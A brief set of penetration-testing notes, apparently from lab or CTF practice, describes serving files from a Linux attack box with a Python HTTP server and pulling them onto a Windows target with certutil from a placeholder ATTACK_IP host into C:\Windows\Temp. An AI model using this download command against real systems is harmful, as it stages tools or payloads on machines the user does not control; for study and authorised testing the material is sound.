1The Goal:.using certutil to transfer files from attackbox(linux) to target(windows)

1.start the HTPP server from linux
	a.python3 -m http.server 8080
2.on the windows target run the certutil command
	acertutil.exe -urlcache -f http://<ATTACK_IP>:8080/README.license C:\Windows\Temp\README.license